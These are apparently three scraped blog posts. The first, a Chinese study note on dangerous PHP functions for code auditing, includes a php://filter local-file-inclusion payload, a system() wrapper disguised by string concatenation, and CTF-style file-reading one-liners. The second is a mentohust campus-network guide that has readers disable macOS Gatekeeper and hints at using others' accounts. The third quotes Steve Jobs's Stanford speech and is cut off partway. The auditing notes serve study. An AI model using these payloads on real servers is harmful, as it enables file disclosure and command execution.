<p>创建函数有两种方式：</p>
<p>1.使用<strong>function</strong>关键字</p>
<p>2.用<strong>string create_function (string $args,string $code)</strong></p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;$cfunc = create_function(<span class="string">'$v'</span>, <span class="string">'return system($v);'</span>);</span><br><span class="line">&gt;&gt;$cfunc = (<span class="string">'whoami'</span>);</span><br><span class="line">&gt;&gt;<span class="comment">//上下两者创建匿名函数的方式不同，但是结果一样</span></span><br><span class="line">&gt;&gt;$cfunc = <span class="string">'sys'</span>.<span class="string">'tem'</span>;<span class="comment">//用'.'来拼接</span></span><br><span class="line">&gt;&gt;$cfunc = (<span class="string">'whoami'</span>);</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>两种定义函数方式的区别</p>
<p><strong>function定义的函数是在编译阶段生成的</strong></p>
<p><strong>create_function创建的函数是在执行阶段生成的</strong></p>
<p><strong>所以，可以在function定义的函数定义之前或则之后调用它。</strong></p>
</blockquote>
<h3 id="callable"><a href="#callable" class="headerlink" title="callable"></a>callable</h3><p>call_user_func_array()  和。call_user_func()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($v1)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"testing $v1"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'test'</span>,<span class="string">'karma'</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//输出 testing karma</span></span><br><span class="line"><span class="comment">//若为function test(callable $v1) 强制回调类型，则会出现错误 （why？）</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>
<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>include如果引入的文件不存在,试图继续往下执行,报一个warning<br>(如果你不介意之前的内容是否被包含，之后的内容都要执行，就使用include)</p>
<p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> $file;</span><br></pre></td></tr></table></figure>
<p>在变量$file 可控的情况下，我们就可以包含任意文件。</p>
<p>由于配置环境不同，可以分为<strong>远程文件</strong>和<strong>本地文件</strong>包含。</p>
<p>包含函数也能读取任意文件内容，需要用到【支持的协议和封装协议】和【过滤器】</p>
<p>eg:用php留filter读取任意文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//?file=php://filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
<h3 id="require"><a href="#require" class="headerlink" title="require"></a>require</h3><p>比include更严谨：</p>
<p>require如果引入的文件不存在,报fatal error,不再继续执行.<br>(如果之前的内容一定要被包含，才允许继续执行之后的代码，就使用require)</p>
<p><em>Include/require 与 include_once /require_once的区别</em></p>
<p><em>_once 会自动判断文件是否已经引入,如果引入,不再重复执行.</em><br><em>即:保证被包含文件只可能被引入一次.</em><br><em>(如果包含的文件里有定义函数，那么被包含的文件只能被包含一次，如果多次包含，就会出现函数重定义的错误，php是不运行函数重定义的，会出现致命错误，之后代码不在运行)</em></p>
<h3 id="allow-url-include-on"><a href="#allow-url-include-on" class="headerlink" title="allow_url_include = on"></a>allow_url_include = on</h3><p>远程文件包含</p>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">(string $command,array[optional] $output,int[optional] $return_value)</span></span></span><br></pre></td></tr></table></figure>
<p>执行一个外部程序</p>
<p>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">passthru</span><span class="params">(string $command,int[optional] $return_value)</span></span></span><br></pre></td></tr></table></figure>
<p>执行外部程序并且显示原始输出</p>
<p>passthru与system的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource proc_open ( string $cmd , <span class="keyword">array</span> $descriptorspec , <span class="keyword">array</span> &amp;$pipes [, string $cwd [, <span class="keyword">array</span> $env [, <span class="keyword">array</span> $other_options ]]] )</span><br></pre></td></tr></table></figure>
<p>执行一个命令，并且打开用来输入/输出的文件指针</p>
<h3 id="shell-exec-amp"><a href="#shell-exec-amp" class="headerlink" title="shell_exec()&amp;``"></a>shell_exec()&amp;``</h3><p>shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</p>
<p>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</p>
<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">system</span><span class="params">(string $command,int[optional] $return_value)</span></span></span><br></pre></td></tr></table></figure>
<p>执行外部程序，并且显示输出</p>
<p>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(command,mode)</span><br></pre></td></tr></table></figure>
<p>通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行。</p>
<h3 id="fcntl-exec"><a href="#fcntl-exec" class="headerlink" title="fcntl_exec()"></a>fcntl_exec()</h3><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><p>// 该函数用于过滤</p>
<p>……</p>
<h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(source,destination)</span><br></pre></td></tr></table></figure>
<p>拷贝文件</p>
<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get contents"></a>file_get contents</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure>
<p>将整个文件读入一个字符串</p>
<h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put contents"></a>file_put contents</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(file,data,mode,context)</span><br></pre></td></tr></table></figure>
<p>将一个字符串写入文件</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(path,include_path,context)</span><br></pre></td></tr></table></figure>
<p>把整个文件读入一个数组中</p>
<h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>
<p>打开文件或者url</p>
<h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br></pre></td></tr></table></figure>
<p>将上传的文件移动到新的位置</p>
<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>
<p>输出文件</p>
<h3 id="rename"><a href="#rename" class="headerlink" title="rename"></a>rename</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(oldname,newname,context)</span><br></pre></td></tr></table></figure>
<p>重命名一个文件或目录</p>
<h3 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir(dir,context)</span><br></pre></td></tr></table></figure>
<p>删除目录</p>
<h3 id="unlink-amp-delete"><a href="#unlink-amp-delete" class="headerlink" title="unlink &amp; delete"></a>unlink &amp; delete</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(filename,context)</span><br></pre></td></tr></table></figure>
<p>删除文件</p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><blockquote>
<p>hightlight_file($filename);<br>show_source($filename);<br>print_r(php_strip_whitespace($filename));<br>print_r(file_get_contents($filename));<br>readfile($filename);<br>print_r(file($filename)); // var_dump<br>fread(fopen(filename,”r”),filename,”r”),size);<br>include($filename); // 非php代码<br>include_once($filename); // 非php代码<br>require($filename); // 非php代码<br>require_once($filename); // 非php代码<br>print_r(fread(popen(“cat flag”, “r”), $size));<br>print_r(fgets(fopen($filename, “r”))); // 读取一行<br>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF<br>print_r(fgetcsv(fopen(filename,”r”),filename,”r”),size));<br>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记<br>print_r(fscanf(fopen(“flag”, “r”),”%s”));<br>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</p>
</blockquote>
<p>……</p>
<h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><h4 id="bool-phpinfo-int-what-INFO-ALL"><a href="#bool-phpinfo-int-what-INFO-ALL" class="headerlink" title="bool phpinfo ([int $what = INFO_ALL])"></a>bool phpinfo ([int $what = INFO_ALL])</h4><p>输出php当前状态的大量信息</p>
<h3 id="软连接-读取文件内容："><a href="#软连接-读取文件内容：" class="headerlink" title="软连接-读取文件内容："></a>软连接-读取文件内容：</h3><h4 id="bool-symlink-string-target-string-link"><a href="#bool-symlink-string-target-string-link" class="headerlink" title="bool symlink (string $target ,string $link)"></a>bool symlink (string $target ,string $link)</h4><p>symlink()对于已有的target建立一个名为link的符号连接</p>
<h4 id="string-redline-string-path"><a href="#string-redline-string-path" class="headerlink" title="string redline (string $path)"></a>string redline (string $path)</h4><p>readlink()和同名的c函数做同样的事，返回符号连接的内容</p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><h4 id="string-getenv-string-varname"><a href="#string-getenv-string-varname" class="headerlink" title="string getenv (string $varname)"></a>string getenv (string $varname)</h4><p>获取一个环境变量的值</p>
<h4 id="bool-putenv-string-setting"><a href="#bool-putenv-string-setting" class="headerlink" title="bool putenv (string $setting)"></a>bool putenv (string $setting)</h4><p>增加setting到服务器环境变量。环境变量仅存活于当前请求期间。在请求结束时环境会恢复到初始状态</p>
<h3 id="加载扩展"><a href="#加载扩展" class="headerlink" title="加载扩展"></a>加载扩展</h3><h4 id="bool-dl-string-library"><a href="#bool-dl-string-library" class="headerlink" title="bool dl (string $library)"></a>bool dl (string $library)</h4><p>载入指定参数library的php扩展</p>
<h3 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h3><p>string ini_get (string $varname)</p>
<p>成功时返回配置选项的值</p>
<p>string ini_set (string $varname , string $newvalue)</p>
<p>string ini_alter (string $varname , string $newvalue)</p>
<p>设置指定配置选项。这个选项会在脚本执行时 保持新的值，并在脚本结束后恢复</p>
<p>void ini_numeric (mixed $var)</p>
<p>恢复指定的配置选项到它的原始值</p>
<h3 id="数字判断"><a href="#数字判断" class="headerlink" title="数字判断"></a>数字判断</h3><p>Bool is_numeric (mixed $var)</p>
<p>如果var时数字和数字字符串则返回true，否则返回false</p>
<p><strong>仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入</strong></p>
<h3 id="数组相关"><a href="#数组相关" class="headerlink" title="数组相关"></a>数组相关</h3><p>Bool in_array (mixed. $needle , array $haystack [,bool $strict =false])</p>
<p>在haystack中搜索needle，如果没有设置strict则使用宽松的比较</p>
<p>该函数有一个特性，比较之前会进行自动类型转换：<strong><em>$a = ‘1abc’;</em></strong></p>
<h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><blockquote>
<p><a href="http://php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">$GLOBALS</a></p>
</blockquote>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>void parse_str (string $str [,array &amp; &amp;str])</p>
<p>如果str是URL传递入的查询字符串(query string)，则将它解析为变量并设置到当前作用域</p>
<p>int extract (array &amp;var_array [,int $extract_type = EXTR_OVERWRITE [, srting $orefix = NULL]])</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突</p>
<p>Bool mb_parse_str ( string $encoded_string [, array. &amp;result ])</p>
<p>解析GET/POST/Cookie 变量导入到全局作用域中。如果你禁止了 register_glovals，但又想用到一些全局变量，那么此函数就很有用</p>
<blockquote>
<p>extract()<br>import_request_variables()<br>parse_str()<br>mb_parse_str()<br>全局变量覆盖：register_globals为ON，$GLOBALS</p>
</blockquote>
<h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><p>array glob ( string $pattern [, int $flags =0])</p>
<p>glob()函数依照libc glob()函数使用的规则寻找所有与pattern匹配的文件路径，类似于一般shells所用的规则一样。不进行缩写扩展或参数替代。</p>
<blockquote>
<p>print_r(glob(“<em>”)); // 列当前目录<br>print_r(glob(“/</em>”)); // 列根目录 print_r(scandir(“.”));<br>print_r(scandir(“/“));<br>$d=opendir(“.”);while(false!==($f=readdir($d))){echo”$f\n”;}<br>$d=dir(“.”);while(false!==($f=$d-&gt;read())){echo$f.”\n”;}</p>
</blockquote>
<h3 id="无参数获取信息"><a href="#无参数获取信息" class="headerlink" title="无参数获取信息"></a>无参数获取信息</h3><p>array get_defined_vars (void)</p>
<p>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户自定义变量</p>
<p>array get_defined_constants ([bool $categorize = false])</p>
<p>返回当前所有已定义的常量名和值。这包含define()函数所创建的，也包含了所有拓展所创建的</p>
<p>array get_defined_functions (void)</p>
<p>返回一个包含所有已定义函数列表的多位数组</p>
<p>array get_included_files (void)</p>
<p>返回所有被include、include_once、require和require_once的文件名</p>
<h3 id="序列化函数"><a href="#序列化函数" class="headerlink" title="序列化函数"></a>序列化函数</h3><blockquote>
<p>serialize()<br>unserialize()<br>ini_set(‘session.serialize_handler’, ‘php_serialize’);</p>
</blockquote>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote>
<p>move_uploaded_file()<br>getimagesize() //验证文件头只要为GIF89a，就会返回真</p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>代码执行函数：</p>
<p><a href="http://www.cnblogs.com/galaxyyao/archive/2013/04/25/3043104.html" target="_blank" rel="noopener">PHP Eval研究笔记</a></p>
<p><a href="https://www.douban.com/note/217557007/" target="_blank" rel="noopener">PHP assert函数的用法</a></p>
<p><a href="http://www.jb51.net/article/46458.htm" target="_blank" rel="noopener">PHP preg_replace() 正则替换所有符合条件的字符串</a></p>
<p><a href="http://blog.csdn.net/hsd2012/article/details/46274475" target="_blank" rel="noopener">PHP——创建函数</a></p>
<p><a href="http://blog.csdn.net/fdipzone/article/details/52336763" target="_blank" rel="noopener">PHP——使用callable强制指定回调类型</a></p>
<p>包含函数：</p>
<p><a href="http://netsecurity.51cto.com/art/201605/511323.htm" target="_blank" rel="noopener">PHP——Info()信息泄漏漏洞利用提权及防范</a></p>
<p><a href="">PHP——include 和 require 的理解与区别</a></p>
<p>命令执行函数：</p>
<p><a href="http://blog.csdn.net/shaobingj126/article/details/6461721" target="_blank" rel="noopener">PHP——exec()函数以及获取其返回值</a></p>
<p><a href="http://blog.csdn.net/beyond__devil/article/details/53868309" target="_blank" rel="noopener">PHP——执行系统外部命令函数:exec()、passthru()、system()、shell_exec()</a></p>
<p>文件操作函数：</p>
<p>特殊函数：</p>
<p><a href="http://blog.csdn.net/xiajun07061225/article/details/7163249" target="_blank" rel="noopener">Linux连接文件：硬连接和软连接</a></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac下配置mentohust连接校园网/移动/联通/]]></title>
      <url>/2017/12/08/mentohust/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>开学，兴高采烈地去开通校园网，结果插上网线，下好客户端……<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>一开始，我还是“年轻地“以为客户端会兼容Mac，我会像用windows的室友一样，轻轻松松地连上校园网。<br>然而，当我点开客户端时～～<img src="https://ws4.sinaimg.cn/large/006tNc79gy1fmec94r8uxj30nc08qtb2.jpg" width="300px"></p>
<p>原因：可能锐捷客户端是被修改过的，所以mac会自动识别为文件损坏（就像你打开**软件一样）<br>解决方法：打开终端，并输入 如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure>
<p>根据提示，输入密码–&gt;回车，你再打开锐捷客户端，如果运气好，那你就可以像你的windows室友一样轻轻松松连上校园网了。（反正我是不行&gt;.&lt;）</p>
<p>所以我们还是老老实实的配置mentohust吧QAQ </p>
<h4 id="0x01首先需要下载mentohust配置文件"><a href="#0x01首先需要下载mentohust配置文件" class="headerlink" title="0x01首先需要下载mentohust配置文件"></a>0x01首先需要下载mentohust配置文件</h4><p>百度云：链接:<a href="https://pan.baidu.com/s/1mi3QOfY" target="_blank" rel="noopener">https://pan.baidu.com/s/1mi3QOfY</a>  密码:avwy</p>
<h4 id="0x02配置重要步骤"><a href="#0x02配置重要步骤" class="headerlink" title="0x02配置重要步骤"></a>0x02配置重要步骤</h4><p>1⃣把mentohust_mac压缩包里的dhcping和mentohust文件复制到/usr/bin/目录下.<br>如果你无法复制到上面的目录，可以尝试<strong>在/usr/local/bin中进行以下操作（别忘了拷贝上面两个文件到这里）</strong>。</p>
<blockquote>
<p>有人会问：“我怎么没看到/usr/local/bin在哪里？</p>
<p>废话，那是隐藏文件夹，肯定啊！！</p>
<p>所以你只需要右键你的finder：finder-&gt;前往-&gt;前往文件夹-&gt;……</p>
</blockquote>
<p>2⃣其次，在/etc目录下新建mentohust文件夹，然后把网盘里面下载下来的三个压缩包解压后的文件全部丢到这里面。</p>
<p>3⃣打开终端，输入sudo mentohust，按照提示选择。   </p>
<p>具体有什么设置我忘记了，反正账号名是学号，密码是教务处密码。</p>
<p><strong><em>敲黑板，划重点！！</em></strong></p>
<p><strong><em>组播方式，我选的1，锐捷，，，DHCP认证方式，我选择的2认证后；</em></strong></p>
<p><strong><em>最重要的就是选网卡，如果你有虚拟机，你直接就可以看到你的网线是在哪个网卡上，像我一样：</em></strong></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fmecyi97uxj30wo0eaae0.jpg" width="500px"></p>
<p><strong><em>实在不行，那就用穷举法吧！</em></strong></p>
<p>一步步完成，你现在应该是可以连上校园网的了。</p>
<h4 id="0x03修改用户信息"><a href="#0x03修改用户信息" class="headerlink" title="0x03修改用户信息"></a>0x03修改用户信息</h4><p>1⃣在穷举法的途中，你可能不能一步到位就找到你的网卡，所以你就要<strong>在/etc目录下找到mentohust.conf文件删除掉</strong>，然后把网线拔了再插进去，再重新输入sudo mentohust 重复<strong><em>0x02</em></strong>步骤，直到找到真正的网卡为止！！</p>
<p>2⃣或许你要坏坏地用别人的账号去登陆校园网，那你还是重复1⃣步骤吧！</p>
<h4 id="0x04-配置移动-联通宽带"><a href="#0x04-配置移动-联通宽带" class="headerlink" title="0x04 配置移动/联通宽带"></a>0x04 配置移动/联通宽带</h4><p>其实，当你成功连上了校园网之后，你只需要一条命令加上一个配置文件就可以顺利连上运营商的宽带了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mentohust -f/etc/mentohust/data.mpf -w</span><br></pre></td></tr></table></figure>
<p><strong>/etc/mentohust/yidong.mpf 这里只要修改成配置文件的对应路径即可，名字记得要改噢！</strong></p>
<p>由于配置文件是学长分享的，所以就不无偿分享了，顺便打个小广告！</p>
<p>扫描下面二维码，</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fmedk7ukpvj30ny0no0uq.jpg" width="300px"></p>
<p>关注公众号，回复“移动”或“联通”分别获取配置文件下载链接。</p>
<center><strong><em>——End——</em></strong></center>

</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MISC </tag>
            
            <tag> mentohust </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Some perceptions after secondly read Steve Jobs‘s speech in Stanford]]></title>
      <url>/2017/12/04/Perception/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>今天翻看自己的notebook，看到了<strong><em>“Stay hungry.Stay foolish”</em></strong>这句话后，就想起老乔（Steve Jobs）在Stanford那个演讲，于是乎，就重新看了遍演讲稿。<br>愈来愈觉得：自己看待生活事物的态度是真的会随着自己年龄的增长而发生微妙的变化。<a id="more"></a></excerpt></p>
<p><the rest="" of="" contents="" |="" 余下全文=""><br><br></the></p>
<p>From Stanford Report, June 14, 2005 </p>
<p>This is the text of the Commencement address by Steve Jobs, CEO of Apple Computer and of Pixar Animation Studios</p>
<p>Delivered on June 12, 2005.</p>
<p> <br></p>
<p>I am honored to be with you today at your commencement from one of the finest universities in the world. I never graduated from college. Truth be told, this is the closest I’ve ever gotten to a college graduation. Today I want to tell you three stories from my life. That’s it. No big deal. Just three stories.</p>
<p><strong>The first story is about connecting the dots.</strong></p>
<p>I dropped out of Reed College after the first 6 months, but then stayed around as a drop-in for another 18 months or so before I really quit. So why did I drop out?</p>
<p>It started before I was born. My biological mother was a young, unwed college graduate student, and she decided to put me up for adoption. She felt very strongly that I should be adopted by college graduates, so everything was all set for me to be adopted at birth by a lawyer and his wife. Except that when I popped out they decided at the last minute that they really wanted a girl. So my parents, who were on a waiting list, got a call in the middle of the night asking: “We have an unexpected baby boy; do you want him?” They said: “Of course.” My biological mother later found out that my mother had never graduated from college and that my father had never graduated from high school. She refused to sign the final adoption papers. She only relented a few months later when my parents promised that I would someday go to college.</p>
<p>And 17 years later I did go to college. But I naively chose a college that was almost as expensive as Stanford, and all of my working-class parents’ savings were being spent on my college tuition. After six months, I couldn’t see the value in it. I had no idea what I wanted to do with my life and no idea how college was going to help me figure it out. And here I was spending all of the money my parents had saved their entire life. So I decided to drop out and trust that it would all work out OK. It was pretty scary at the time, but looking back it was one of the best decisions I ever made. The minute I dropped out I could stop taking the required classes that didn’t interest me, and begin dropping in on the ones that looked interesting.</p>
<p>It wasn’t all romantic. I didn’t have a dorm room, so I slept on the floor in friends’ rooms, I returned coke bottles for the 5￠ deposits to buy food with, and I would walk the 7 miles across town every Sunday night to get one good meal a week at the Hare Krishna temple. I loved it. <strong><em>And much of what I stumbled into by following my curiosity and intuition turned out to be priceless later on.</em></strong> Let me give you one example:</p>
<p>Reed College at that time offered perhaps the best calligraphy instruction in the country. Throughout the campus every poster, every label on every drawer, was beautifully hand calligraphed. Because I had dropped out and didn’t have to take the normal classes, I decided to take a calligraphy class to learn how to do this. I learned about serif and san serif typefaces, about varying the amount of space between different letter combinations, about what makes great typography great. It was beautiful, historical, artistically subtle in a way that science can’t capture, and I found it fascinating.</p>
<p>None of this had even a hope of any practical application in my life. But ten years later, when we were designing the first Macintosh computer, it all came back to me. And we designed it all into the Mac. It was the first computer with beautiful typography. If I had never dropped in on that single course in college, the Mac would have never had multiple typefaces or proportionally spaced fonts. And since Windows just copied the Mac, its likely that no personal computer would have them. If I had never dropped out, I would have never dropped in on this calligraphy class, and personal computers might not have the wonderful typography that they do. Of course it was impossible to connect the dots looking forward when I was in college. But it was very, very clear looking backwards ten years later.</p>
<p>Again, you can’t connect the dots looking forward; you can only connect them looking backwards.<strong><em>So you have to trust that the dots will somehow connect in your future. You have to trust in something — your gut, destiny, life, karma, whatever. This approach has never let me down, and it has made all the difference in my life.</em></strong></p>
<p><strong>My second story is about love and loss.</strong></p>
<p>I was lucky — I found what I loved to do early in life. Woz and I started Apple in my parents garage when I was 20. We worked hard, and in 10 years Apple had grown from just the two of us in a garage into a $2 billion company with over 4000 employees. We had just released our finest creation — the Macintosh — a year earlier, and I had just turned 30. And then I got fired. How can you get fired from a company you started? Well, as Apple grew we hired someone who I thought was very talented to run the company with me, and for the first year or so things went well. But then our visions of the future began to diverge and eventually we had a falling out. When we did, our Board of Directors sided with him. So at 30 I was out. And very publicly out. What had been the focus of my entire adult life was gone, and it was devastating.</p>
<p>I really didn’t know what to do for a few months. I felt that I had let the previous generation of entrepreneurs down - that I had dropped the baton as it was being passed to me. I met with David Packard and Bob Noyce and tried to apologize for screwing up so badly. I was a very public failure, and I even thought about running away from the valley. But something slowly began to dawn on me — I still loved what I did. The turn of events at Apple had not changed that one bit. I had been rejected, but I was still in love. And so I decided to start over.</p>
<p>I didn’t see it then, but it turned out that getting fired from Apple was the best thing that could have ever happened to me. The heaviness of being successful was replaced by the lightness of being a beginner again, less sure about everything. It freed me to enter one of the most creative periods of my life.</p>
<p>During the next five years, I started a company named NeXT, another company named Pixar, and fell in love with an amazing woman who would become my wife. Pixar went on to create the worlds first computer animated feature film, Toy Story, and is now the most successful animation studio in the world. In a remarkable turn of events, Apple bought NeXT, I returned to Apple, and the technology we developed at NeXT is at the heart of Apple’s current renaissance. And Laurene and I have a wonderful family together.</p>
